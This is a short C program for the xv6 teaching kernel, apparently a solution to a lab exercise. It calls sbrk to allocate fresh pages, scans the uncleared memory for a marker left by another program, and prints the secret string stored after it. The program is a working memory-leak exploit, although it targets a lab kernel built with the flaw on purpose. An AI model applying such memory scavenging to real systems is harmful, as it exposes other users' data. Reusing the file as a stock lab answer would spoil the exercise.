#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
  // LAB_SYSCALL intentionally leaves reallocated physical pages uncleared.
  // Search for secret.c's marker rather than assuming an allocator order.
  int size = 128 * PGSIZE;
  char *mem = sbrk(size);
  if(mem == SBRK_ERROR) exit(1);
  char marker[] = "This may help.";
  for(int i = 0; i + 16 + 32 < size; i++){
    if(memcmp(mem+i, marker, sizeof(marker)) != 0) continue;
    char *secret = mem+i+16;
    int n = 0;
    while(n < 32 && ((secret[n] >= '0' && secret[n] <= '9') ||
                    (secret[n] >= 'A' && secret[n] <= 'Z') ||
                    (secret[n] >= 'a' && secret[n] <= 'z'))) n++;
    if(n && n < 32 && secret[n] == 0){
      printf("%s\n", secret);
      exit(0);
    }
  }
  exit(1);
}
